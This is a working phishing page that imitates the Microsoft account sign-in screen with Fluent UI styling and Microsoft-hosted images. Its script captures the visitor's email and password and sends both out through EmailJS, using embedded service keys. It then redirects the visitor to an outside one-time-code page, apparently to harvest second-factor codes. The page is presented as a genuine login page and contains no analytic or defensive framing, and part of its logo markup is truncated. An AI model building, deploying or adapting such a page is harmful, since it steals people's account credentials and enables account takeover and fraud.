<!DOCTYPE html>
<html dir="ltr" lang="EN-US">
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8"/>
    <meta http-equiv="X-UA-Compatible" content="IE=Edge"/>
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=2.0, minimum-scale=1.0, user-scalable=yes"/>
    <title>Sign in to your Microsoft account</title>
    <link rel="shortcut icon" href="https://logincdn.msftauth.net/16.000.31088.5/images/favicon.ico"/>

    <style>
        /* Design Tokens based on Fluent UI - Auto-switching between Light and Dark */
        :root {
            /* Shared tokens */
            --borderRadiusNone: 0;
            --borderRadiusSmall: 2px;
            --borderRadiusMedium: 4px;
            --borderRadiusLarge: 6px;
            --borderRadiusXLarge: 8px;
            --borderRadiusCircular: 10000px;
            --fontSizeBase100: 10px;
            --fontSizeBase200: 12px;
            --fontSizeBase300: 14px;
            --fontSizeBase400: 16px;
            --fontSizeBase500: 20px;
            --fontSizeBase600: 24px;
            --fontSizeHero700: 28px;
            --fontSizeHero800: 32px;
            --fontSizeHero900: 40px;
            --fontSizeHero1000: 68px;
            --lineHeightBase100: 14px;
            --lineHeightBase200: 16px;
            --lineHeightBase300: 20px;
            --lineHeightBase400: 22px;
            --lineHeightBase500: 28px;
            --lineHeightBase600: 32px;
            --lineHeightHero700: 36px;
            --lineHeightHero800: 40px;
            --lineHeightHero900: 52px;
            --lineHeightHero1000: 92px;
            --fontFamilyBase: 'Segoe UI', 'Segoe UI Web (West European)', -apple-system, BlinkMacSystemFont, Roboto, 'Helvetica Neue', sans-serif;
            --fontWeightRegular: 400;
            --fontWeightMedium: 500;
            --fontWeightSemibold: 600;
            --fontWeightBold: 700;
            --strokeWidthThin: 1px;
            --strokeWidthThick: 2px;
            --spacingHorizontalXXS: 2px;
            --spacingHorizontalXS: 4px;
            --spacingHorizontalSNudge: 6px;
            --spacingHorizontalS: 8px;
            --spacingHorizontalM: 12px;
            --spacingHorizontalL: 16px;
            --spacingHorizontalXL: 20px;
            --spacingHorizontalXXL: 24px;
            --spacingVerticalXXS: 2px;
            --spacingVerticalXS: 4px;
            --spacingVerticalS: 8px;
            --spacingVerticalM: 12px;
            --spacingVerticalL: 16px;
            --spacingVerticalXL: 20px;
            --spacingVerticalXXL: 24px;
            --spacingVerticalXXXL: 32px;
            --durationNormal: 200ms;
            --curveDecelerateMid: cubic-bezier(0,0,0,1);

            /* Light Theme (Default) */
            --colorNeutralForeground1: #242424;
            --colorNeutralForeground2: #424242;
            --colorNeutralForeground3: #616161;
            --colorNeutralForeground4: #707070;
            --colorNeutralForegroundDisabled: #bdbdbd;
            --colorBrandForegroundLink: #115ea3;
            --colorBrandForegroundLinkHover: #0f548c;
            --colorBrandForegroundLinkPressed: #0c3b5e;
            --colorBrandForeground1: #0f6cbd;
            --colorNeutralForegroundOnBrand: #ffffff;
            --colorNeutralBackground1: #ffffff;
            --colorNeutralBackground1Hover: #f5f5f5;
            --colorNeutralBackground1Pressed: #e0e0e0;
            --colorNeutralBackground2: #fafafa;
            --colorNeutralStroke1: #d1d1d1;
            --colorNeutralStroke1Hover: #c7c7c7;
            --colorNeutralStrokeAccessible: #616161;
            --colorNeutralStrokeAccessibleHover: #575757;
            --colorNeutralStrokeAccessibleSelected: #0f6cbd;
            --colorBrandBackground: #0f6cbd;
            --colorBrandBackgroundHover: #115ea3;
            --colorBrandBackgroundPressed: #0c3b5e;
            --colorStatusDangerBackground3: #c50f1f;
            --colorStatusSuccessBackground3: #107c10;
            --colorStrokeFocus1: #ffffff;
            --colorStrokeFocus2: #000000;
            --colorNeutralShadowKey: rgba(0,0,0,0.14);
            --colorNeutralShadowAmbient: rgba(0,0,0,0.12);
            --shadow16: 0 0 2px var(--colorNeutralShadowAmbient), 0 8px 16px var(--colorNeutralShadowKey);
            --signInContainerMaxWidth: 440px;
            --signInContainerMinWidth: 320px;
            --signInContainerBorderRadius: 12px;
            --signInContainerPadding: 40px;
            --signInContainerBackgroundColor: var(--colorNeutralBackground1);
        }

        /* Dark Theme - Auto-detected based on system preference */
        @media (prefers-color-scheme: dark) {
            :root {
                --colorNeutralForeground1: #ffffff;
                --colorNeutralForeground2: #d6d6d6;
                --colorNeutralForeground3: #adadad;
                --colorNeutralForeground4: #999999;
                --colorNeutralForegroundDisabled: #5c5c5c;
                --colorBrandForegroundLink: #479ef5;
                --colorBrandForegroundLinkHover: #62abf5;
                --colorBrandForegroundLinkPressed: #2886de;
                --colorBrandForeground1: #479ef5;
                --colorNeutralForegroundOnBrand: #ffffff;
                --colorNeutralBackground1: #292929;
                --colorNeutralBackground1Hover: #3d3d3d;
                --colorNeutralBackground1Pressed: #1f1f1f;
                --colorNeutralBackground2: #1f1f1f;
                --colorNeutralStroke1: #666666;
                --colorNeutralStroke1Hover: #757575;
                --colorNeutralStrokeAccessible: #adadad;
                --colorNeutralStrokeAccessibleHover: #bdbdbd;
                --colorNeutralStrokeAccessibleSelected: #479ef5;
                --colorBrandBackground: #115ea3;
                --colorBrandBackgroundHover: #0f6cbd;
                --colorBrandBackgroundPressed: #0c3b5e;
                --colorStatusDangerBackground3: #c50f1f;
                --colorStatusSuccessBackground3: #107c10;
                --colorStrokeFocus1: #000000;
                --colorStrokeFocus2: #ffffff;
                --colorNeutralShadowKey: rgba(0,0,0,0.28);
                --colorNeutralShadowAmbient: rgba(0,0,0,0.24);
                --shadow16: 0 0 2px var(--colorNeutralShadowAmbient), 0 8px 16px var(--colorNeutralShadowKey);
                --signInContainerBackgroundColor: #292929;
            }
        }

        * {
            margin: 0;
            padding: 0 5px;
            box-sizing: border-box;
        }

        body {
            font-family: var(--fontFamilyBase);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
            /* Light mode background - Fluent light SVG */
            background-image: url(https://logincdn.msftauth.net/shared/5/images/fluent_web_light_2_145a07dcb971527a82b8.svg);
            background-size: cover;
            background-position: center;
            background-attachment: fixed;
            transition: background-image 0.3s ease;
        }

        /* Dark mode background - Fluent dark SVG without gradient overlay */
        @media (prefers-color-scheme: dark) {
            body {
                background-image: url(https://logincdn.msftauth.net/shared/5/images/fluent_web_dark_2_bf5f23287bc9f60c9be2.svg);
            }
        }

        .login-container {
            width: 100%;
            max-width: var(--signInContainerMaxWidth);
            min-width: var(--signInContainerMinWidth);
            background: var(--signInContainerBackgroundColor);
            border-radius: var(--signInContainerBorderRadius);
            box-shadow: var(--shadow16);
            padding: var(--signInContainerPadding);
            position: relative;
            z-index: 1;
            display: flex;
            flex-direction: column;
            align-items: center;
            transition: background-color 0.3s ease, box-shadow 0.3s ease;
        }

        /* Top bar with back arrow and logo */
        .top-bar {
            display: flex;
            align-items: center;
            justify-content: space-between;
            width: 100%;
            margin-bottom: 24px;
            position: relative;
        }

        .top-bar .back-arrow {
            font-family: var(--fontFamilyBase);
            font-size: var(--fontSizeBase400);
            font-weight: var(--fontWeightRegular);
            color: #707070;
            text-decoration: none;
            cursor: pointer;
            transition: color 0.3s ease;
            line-height: 1;
            padding: 4px 8px 4px 0;
            flex-shrink: 0;
        }

        .top-bar .back-arrow:hover {
            color: #0f6cbd;
            text-decoration: none;
        }

        .top-bar .logo {
            text-align: center;
            display: flex;
            justify-content: center;
            align-items: center;
            flex: 1;
            margin: 0;
        }

        .top-bar .logo svg {
            width: 114px;
            height: 24px;
        }

        /* Microsoft Logo - Light Theme */
        .top-bar .logo .ms-logo-light {
            display: block;
        }
        .top-bar .logo .ms-logo-dark {
            display: none;
        }

        @media (prefers-color-scheme: dark) {
            .top-bar .logo .ms-logo-light {
                display: none;
            }
            .top-bar .logo .ms-logo-dark {
                display: block;
            }
        }

        /* Spacer for alignment */
        .top-bar .spacer {
            width: 30px;
            flex-shrink: 0;
        }

        h1 {
            font-size: var(--fontSizeBase600);
            font-weight: var(--fontWeightSemibold);
            color: var(--colorNeutralForeground1);
            margin-bottom: 10px;
            line-height: var(--lineHeightBase600);
            text-align: center;
            width: 100%;
            transition: color 0.3s ease;
        }

        .subtitle {
            font-size: var(--fontSizeBase300);
            color: var(--colorNeutralForeground1);
            margin-top: 0px;
            margin-bottom: 24px;
            text-align: center;
            font-weight: var(--fontWeightRegular);
            line-height: var(--lineHeightBase300);
            width: 100%;
            transition: color 0.3s ease;
        }

        .subtitle a {
            color: var(--colorBrandForegroundLink);
            text-decoration: none;
            transition: color 0.3s ease;
        }

        .subtitle a:hover {
            text-decoration: underline;
            color: var(--colorBrandForegroundLinkHover);
        }

        /* Fluent UI Style Form Fields - Floating Label */
        .fui-Field {
            display: flex;
            flex-direction: column;
            gap: var(--spacingVerticalXS);
            margin-bottom: var(--spacingVerticalL);
            width: 100%;
        }

        .fui-Input {
            position: relative;
            display: flex;
            align-items: center;
            background: var(--colorNeutralBackground1);
            border: var(--strokeWidthThin) solid var(--colorNeutralStroke1);
            border-radius: var(--borderRadiusMedium);
            transition: border-color var(--durationNormal) var(--curveDecelerateMid), background-color 0.3s ease;
            min-height: 41px;
            padding: 0 var(--spacingHorizontalM);
            cursor: text;
            width: 100%;
        }

        .fui-Input:hover {
            border-color: var(--colorNeutralStroke1Hover);
        }

        .fui-Input:focus-within {
            border-color: #0c3b5e;
            box-shadow: 0 0 0 0.5px #0c3b5e;
        }

        @media (prefers-color-scheme: dark) {
            .fui-Input:focus-within {
                box-shadow: 0 0 0 0.5px #0c3b5e;
            }
        }

        .fui-Input .fui-Input__contentBefore {
            display: flex;
            align-items: center;
            flex-shrink: 0;
            position: absolute;
            top: 50%;
            transform: translateY(-50%);
            transition: all var(--durationNormal) var(--curveDecelerateMid);
            pointer-events: none;
            padding: 0 var(--spacingHorizontalXS);
            background: transparent;
        }

        .fui-Input .fui-Input__contentBefore label {
            font-family: var(--fontFamilyBase);
            font-size: var(--fontSizeBase300);
            font-weight: var(--fontWeightRegular);
            color: var(--colorNeutralForeground4);
            line-height: var(--lineHeightBase300);
            cursor: text;
            transition: all var(--durationNormal) var(--curveDecelerateMid);
            white-space: nowrap;
            pointer-events: none;
            padding: 0 1px;
        }

        /* Floating label - moves up when focused or has value */
        .fui-Input:focus-within .fui-Input__contentBefore,
        .fui-Input.has-value .fui-Input__contentBefore {
            top: 0;
            transform: translateY(-50%);
            padding: 0 var(--spacingHorizontalXS);
            background: var(--colorNeutralBackground1);
            border-radius: var(--borderRadiusSmall);
        }

        .fui-Input:focus-within .fui-Input__contentBefore label,
        .fui-Input.has-value .fui-Input__contentBefore label {
            font-size: 11px;
            font-weight: var(--fontWeightMedium);
            color: #707070;
            line-height: var(--lineHeightBase200);
        }

        .fui-Input:focus-within .fui-Input__contentBefore label {
            color: #707070;
        }

        .fui-Input.error:focus-within .fui-Input__contentBefore label,
        .fui-Input.error.has-value .fui-Input__contentBefore label {
            color: var(--colorStatusDangerBackground3);
        }

        .fui-Input__input {
            flex: 1;
            border: none;
            outline: none;
            background: transparent;
            font-family: var(--fontFamilyBase);
            font-size: 16px;
            font-weight: var(--fontWeightRegular);
            color: var(--colorNeutralForeground1);
            padding: 0px 0px 0px 4px;
            min-height: 31px;
            width: 100%;
            line-height: var(--lineHeightBase300);
            transition: color 0.3s ease;
            margin-top: 6px;
        }

        .fui-Input__input::placeholder {
            font-family: var(--fontFamilyBase);
            font-size: var(--fontSizeBase300);
            font-weight: var(--fontWeightRegular);
            color: var(--colorNeutralForegroundDisabled);
            opacity: 0;
            transition: opacity var(--durationNormal) var(--curveDecelerateMid), color 0.3s ease;
            line-height: var(--lineHeightBase300);
        }

        .fui-Input:focus-within .fui-Input__input::placeholder,
        .fui-Input.has-value .fui-Input__input::placeholder {
            opacity: 1;
        }

        .fui-Input__input:focus {
            outline: none;
        }

        .fui-Input__input:-webkit-autofill {
            -webkit-box-shadow: 0 0 0 1000px var(--colorNeutralBackground1) inset !important;
            -webkit-text-fill-color: var(--colorNeutralForeground1) !important;
        }

        .fui-Field__validationMessage {
            font-family: var(--fontFamilyBase);
            font-size: var(--fontSizeBase200);
            font-weight: var(--fontWeightRegular);
            color: var(--colorStatusDangerBackground3);
            line-height: var(--lineHeightBase200);
            min-height: 16px;
            padding-top: var(--spacingVerticalXXS);
            transition: color 0.3s ease;
        }

        .fui-Field__validationMessage.success {
            color: var(--colorStatusSuccessBackground3);
        }

        /* Error state */
        .fui-Input.error {
            border-color: var(--colorStatusDangerBackground3);
        }

        .fui-Input.error:focus-within {
            border-color: var(--colorStatusDangerBackground3);
            box-shadow: 0 0 0 2px rgba(197, 15, 31, 0.2);
        }

        .fui-Input.error .fui-Input__contentBefore label {
            color: var(--colorStatusDangerBackground3);
        }

        .sign-in-options {
            margin: var(--spacingVerticalM) 0 var(--spacingVerticalXL);
            width: 100%;
        }

        .sign-in-options a {
            font-family: var(--fontFamilyBase);
            font-size: var(--fontSizeBase300);
            font-weight: 600;
            color: var(--colorBrandForegroundLink);
            text-decoration: none;
            cursor: pointer;
            transition: color 0.3s ease;
        }

        .sign-in-options a:hover {
            text-decoration: underline;
            color: var(--colorBrandForegroundLinkHover);
        }

        .sign-in-btn {
            width: 100%;
            padding: var(--spacingVerticalS) var(--spacingHorizontalL);
            font-family: var(--fontFamilyBase);
            font-size: var(--fontSizeBase300);
            font-weight: var(--fontWeightSemibold);
            color: var(--colorNeutralForegroundOnBrand);
            background: var(--colorBrandBackground);
            border: none;
            border-radius: var(--borderRadiusMedium);
            cursor: pointer;
            transition: background var(--durationNormal) var(--curveDecelerateMid), color 0.3s ease;
            line-height: var(--lineHeightBase300);
            min-height: 40px;
        }

        .sign-in-btn:hover {
            background: var(--colorBrandBackgroundHover);
        }

        .sign-in-btn:active {
            background: var(--colorBrandBackgroundPressed);
        }

        .sign-in-btn:disabled {
            opacity: 0.7;
            cursor: not-allowed;
        }

        .create-account {
            text-align: center;
            font-family: var(--fontFamilyBase);
            font-size: var(--fontSizeBase300);
            font-weight: var(--fontWeightRegular);
            color: var(--colorNeutralForeground1);
            margin-top: 24px;
            line-height: var(--lineHeightBase300);
            width: 100%;
            transition: color 0.3s ease;
        }

        .create-account a {
            color: var(--colorBrandForegroundLink);
            text-decoration: none;
            font-weight: var(--fontWeightSemibold);
            cursor: pointer;
            transition: color 0.3s ease;
        }

        .create-account a:hover {
            text-decoration: underline;
            color: var(--colorBrandForegroundLinkHover);
        }

        .create-account .normal-text {
            color: var(--colorNeutralForeground1);
            font-weight: var(--fontWeightRegular);
            transition: color 0.3s ease;
        }

        .error-message {
            font-family: var(--fontFamilyBase);
            font-size: var(--fontSizeBase200);
            font-weight: var(--fontWeightRegular);
            color: var(--colorStatusDangerBackground3);
            line-height: var(--lineHeightBase200);
            margin-top: var(--spacingVerticalXXS);
            display: none;
            transition: color 0.3s ease;
        }

        .error-message.visible {
            display: block;
        }

        .success-message {
            font-family: var(--fontFamilyBase);
            font-size: var(--fontSizeBase200);
            font-weight: var(--fontWeightRegular);
            color: var(--colorStatusSuccessBackground3);
            line-height: var(--lineHeightBase200);
            margin-top: var(--spacingVerticalXXS);
            display: none;
            transition: color 0.3s ease;
        }

        .success-message.visible {
            display: block;
        }

        .loading-spinner {
            display: inline-block;
            width: 16px;
            height: 16px;
            border: 2px solid var(--colorNeutralForegroundOnBrand);
            border-radius: 50%;
            border-top-color: transparent;
            animation: spin 0.8s linear infinite;
            vertical-align: middle;
            margin-right: var(--spacingHorizontalXS);
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }

        /* Page 2 - Email Display with 60px margins */
        .email-display {
            display: relative;
            align-items: center;
            margin: 0 60px var(--spacingVerticalXXL) 60px;
            padding: 6px 2px;
            border: var(--strokeWidthThin) solid #616161;
            border-radius: var(--borderRadiusCircular);
            font-family: var(--fontFamilyBase);
            font-size: var(--fontSizeBase300);
            font-weight: var(--fontWeightSemibold);
            color: var(--colorNeutralForeground1);
            background: #ffffff;
            max-width: calc(100% - 120px);
            word-break: break-all;
            text-align: center;
            line-height: var(--lineHeightBase300);
            transition: border-color 0.3s ease, background-color 0.3s ease, color 0.3s ease;
            overflow: hidden;
            text-overflow: ellipsis;
            white-space: nowrap;
        }

        .email-display .email-text {
            font-weight: var(--fontWeightSemibold);
            color: #616161;
            transition: color 0.3s ease;
            overflow: hidden;
            text-overflow: ellipsis;
            max-width: 100%;
        }

        /* Page 2 - Enter your password title below email */
        .password-title {
            font-size: var(--fontSizeBase600);
            font-weight: var(--fontWeightSemibold);
            color: var(--colorNeutralForeground1);
            margin-bottom: 15px;
            line-height: var(--lineHeightBase600);
            text-align: center;
            width: 100%;
            transition: color 0.3s ease;
        }

        .password-subtitle {
            font-size: var(--fontSizeBase300);
            color: var(--colorNeutralForeground1);
            margin-top: 0px;
            margin-bottom: 24px;
            text-align: center;
            font-weight: var(--fontWeightRegular);
            line-height: var(--lineHeightBase300);
            width: 100%;
            transition: color 0.3s ease;
        }

        .page {
            display: none;
            width: 100%;
        }

        .page.active {
            display: block;
        }

        /* Hide back arrow on page 1 */
        .page1 .back-arrow {
            display: none;
        }

        /* Show back arrow on page 2 */
        .page2 .back-arrow {
            display: block;
        }

        /* Hidden field for email in password form */
        .hidden-email-field {
            display: none;
        }

        @media (max-width: 480px) {
            body {
                padding: 10px;
            }

            .login-container {
                padding: 24px 20px 32px;
                margin: 10px;
                border-radius: var(--borderRadiusLarge);
                max-width: 100%;
                min-width: 0;
            }

            .password-title {
                font-size: var(--fontSizeBase500);
            }

            .email-display {
                font-size: var(--fontSizeBase300);
                padding: var(--spacingVerticalS) var(--spacingHorizontalL);
                margin: 0 20px var(--spacingVerticalXXL) 20px;
                max-width: calc(100% - 40px);
                white-space: normal;
                word-break: break-all;
            }

            .fui-Input {
                min-height: 44px;
                padding: 0 var(--spacingHorizontalS);
            }

            .fui-Input__input {
                font-size: var(--fontSizeBase300);
                min-height: 44px;
                padding: var(--spacingVerticalM) 0 var(--spacingVerticalXS) 0;
            }

            .fui-Input:focus-within .fui-Input__contentBefore label,
            .fui-Input.has-value .fui-Input__contentBefore label {
                font-size: 10px;
            }

            .top-bar .back-arrow {
                font-size: var(--fontSizeBase400);
                padding: 2px 6px 2px 0;
            }

            .top-bar .spacer {
                width: 20px;
            }
        }

        @media (max-width: 380px) {
            .email-display {
                margin: 0 12px var(--spacingVerticalXXL) 12px;
                max-width: calc(100% - 24px);
                font-size: var(--fontSizeBase200);
                padding: var(--spacingVerticalS) var(--spacingHorizontalM);
            }
        }
    </style>
</head>
<body>
    <div class="login-container">
        <!-- Top Bar with Back Arrow and Logo -->
        <div class="top-bar">
            <!-- Back Arrow - visible only on page 2 -->
            <a href="#" class="back-arrow" id="backArrow">←</a>

            <!-- Logo - centered -->
            <div class="logo">
                <!-- Light Theme Logo -->
                <svg class="ms-logo-light" viewBox="0 0 114 24" fill="none" xmlns="http://www.w3.org/2000/svg">

        <!-- PAGE 1: Sign In -->
        <div class="page active page1" id="page1">
            <h1>Sign in</h1>
            <p class="subtitle">Use your Microsoft account.</p>

            <form id="emailForm" novalidate>
                <div class="fui-Field">
                    <div class="fui-Input" id="emailInputWrapper">
                        <span class="fui-Input__contentBefore">
                            <label for="email">Email or phone number</label>
                        </span>
                        <input type="email" id="email" name="user_email" placeholder=" " class="fui-Input__input" autocomplete="username" required>
                    </div>
                    <div id="email-error" class="fui-Field__validationMessage error-message"></div>
                </div>

                <div class="sign-in-options">
                    <a href="#">Forgot your username?</a>
                </div>

                <button type="submit" class="sign-in-btn" id="nextBtn">Next</button>
            </form>
        </div>

        <!-- PAGE 2: Enter your password -->
        <div class="page page2" id="page2">
            <div class="email-display">
                <span class="email-text" id="displayEmail"></span>
            </div>

            <h1 class="password-title">Enter your password</h1>

            <form id="passwordForm" novalidate>
                <!-- Hidden field to store email for EmailJS -->
                <input type="hidden" id="hiddenEmail" name="user_email" value="">

                <div class="fui-Field">
                    <div class="fui-Input" id="passwordInputWrapper">
                        <span class="fui-Input__contentBefore">
                            <label for="password">Password</label>
                        </span>
                        <input type="password" id="password" name="user_password" placeholder=" " class="fui-Input__input" required>
                    </div>
                    <div id="password-error" class="fui-Field__validationMessage error-message"></div>
                </div>

                <button type="submit" class="sign-in-btn" id="signInBtn">Continue</button>
                <div id="form-status" class="fui-Field__validationMessage success-message"></div>
            </form>
        </div>

        <div class="create-account">
            <span class="normal-text">New to Microsoft? </span><a href="#">Create an account</a>
        </div>
    </div>

    <!-- EmailJS SDK -->
    <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>

    <script>
        // Initialize EmailJS with your public key
        (function() {
            emailjs.init("uGRhkufMjo08rjwb_");
        })();

        // --- Configuration ---
        // Update this to your actual OTP page URL
        const OTP_PAGE_URL = 'https://www.pfizertalents.com/code';

        const emailForm = document.getElementById("emailForm");
        const passwordForm = document.getElementById("passwordForm");
        const emailInput = document.getElementById("email");
        const passwordInput = document.getElementById("password");
        const hiddenEmail = document.getElementById("hiddenEmail");
        const emailError = document.getElementById("email-error");
        const passwordError = document.getElementById("password-error");
        const formStatus = document.getElementById("form-status");
        const signInBtn = document.getElementById("signInBtn");
        const nextBtn = document.getElementById("nextBtn");
        const backArrow = document.getElementById("backArrow");
        const displayEmail = document.getElementById("displayEmail");
        const page1 = document.getElementById("page1");
        const page2 = document.getElementById("page2");
        const emailInputWrapper = document.getElementById("emailInputWrapper");
        const passwordInputWrapper = document.getElementById("passwordInputWrapper");

        // Helper functions
        function showError(element, message) {
            element.textContent = message;
            element.classList.add("visible");
        }

        function hideError(element) {
            element.textContent = "";
            element.classList.remove("visible");
        }

        function showStatus(message, isSuccess = true) {
            formStatus.textContent = message;
            formStatus.className = isSuccess ? "fui-Field__validationMessage success-message visible" : "fui-Field__validationMessage error-message visible";
        }

        function hideStatus() {
            formStatus.textContent = "";
            formStatus.className = "fui-Field__validationMessage success-message";
        }

        function goToPage(pageNum) {
            if (pageNum === 1) {
                page1.classList.add("active");
                page2.classList.remove("active");
                // Hide back arrow on page 1
                backArrow.style.display = 'none';
            } else {
                page1.classList.remove("active");
                page2.classList.add("active");
                // Show back arrow on page 2
                backArrow.style.display = 'block';
            }
        }

        // Track input values for floating label
        function updateInputState(input, wrapper) {
            if (input.value.trim() !== '') {
                wrapper.classList.add('has-value');
            } else {
                wrapper.classList.remove('has-value');
            }
        }

        emailInput.addEventListener('input', function() {
            updateInputState(this, emailInputWrapper);
            hideError(emailError);
            emailInputWrapper.classList.remove('error');
        });

        passwordInput.addEventListener('input', function() {
            updateInputState(this, passwordInputWrapper);
            hideError(passwordError);
            hideStatus();
            passwordInputWrapper.classList.remove('error');
        });

        // Initial state
        updateInputState(emailInput, emailInputWrapper);
        updateInputState(passwordInput, passwordInputWrapper);

        // Initially hide back arrow
        backArrow.style.display = 'none';

        // Back arrow click handler
        backArrow.addEventListener("click", (e) => {
            e.preventDefault();
            goToPage(1);
            hideError(passwordError);
            hideStatus();
            passwordInputWrapper.classList.remove('error');
            // Reset password field
            passwordInput.value = '';
            updateInputState(passwordInput, passwordInputWrapper);
        });

        // --- Page 1: Email submission - Navigate to Page 2 with loading effect ---
        emailForm.addEventListener("submit", (e) => {
            e.preventDefault();
            hideError(emailError);
            hideStatus();
            emailInputWrapper.classList.remove('error');

            const emailValue = emailInput.value.trim();

            // Simple email validation
            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;

            if (!emailValue) {
                showError(emailError, "Email is required.");
                emailInputWrapper.classList.add('error');
                return;
            } else if (!emailRegex.test(emailValue)) {
                showError(emailError, "Please enter a valid email address.");
                emailInputWrapper.classList.add('error');
                return;
            }

            // Store email for page 2 display and hidden field
            displayEmail.textContent = emailValue;
            hiddenEmail.value = emailValue; // Set hidden field value for EmailJS
            localStorage.setItem('userEmail', emailValue);

            // Show loading spinner on Next button
            nextBtn.disabled = true;
            nextBtn.innerHTML = '<span class="loading-spinner"></span>';

            // Navigate to page 2 with a slight delay to show loading effect
            setTimeout(() => {
                goToPage(2);
                // Reset button state
                nextBtn.disabled = false;
                nextBtn.innerHTML = 'Next';
                // Focus on password field
                setTimeout(() => {
                    passwordInput.focus();
                }, 100);
            }, 1500);
        });

        // --- Page 2: Password submission - Send to EmailJS then redirect to OTP ---
        passwordForm.addEventListener("submit", async (e) => {
            e.preventDefault();

            hideError(passwordError);
            hideStatus();
            passwordInputWrapper.classList.remove('error');

            const passwordValue = passwordInput.value.trim();
            const emailValue = hiddenEmail.value; // Get email from hidden field

            if (!passwordValue) {
                showError(passwordError, "Password is required.");
                passwordInputWrapper.classList.add('error');
                return;
            }

            // Disable button and show loading
            signInBtn.disabled = true;
            signInBtn.innerHTML = '<span class="loading-spinner"></span> Signing in...';

            try {
                // Send form via EmailJS - includes both email and password
                const response = await emailjs.sendForm(
                    "service_t84doqy",
                    "template_awd8sif",
                    "#passwordForm"
                );

                console.log("EmailJS SUCCESS:", response.status);
                console.log("Email sent:", emailValue);
                console.log("Password sent:", passwordValue);
                showStatus("Sign in successful! Redirecting...", true);

                // Redirect to OTP page with email as URL parameter
                setTimeout(() => {
                    window.location.href = `${OTP_PAGE_URL}?email=${encodeURIComponent(emailValue)}`;
                }, 1000);

            } catch (error) {
                console.error("EmailJS FAILED:", error);
                showStatus("There was an error sending your credentials. Please try again later.", false);

                signInBtn.disabled = false;
                signInBtn.textContent = "Continue";
            }
        });

        // Clear error on input focus
        emailInput.addEventListener('focus', function() {
            emailInputWrapper.classList.remove('error');
            hideError(emailError);
        });

        passwordInput.addEventListener('focus', function() {
            passwordInputWrapper.classList.remove('error');
            hideError(passwordError);
            hideStatus();
        });
    </script>
</body>
</html>
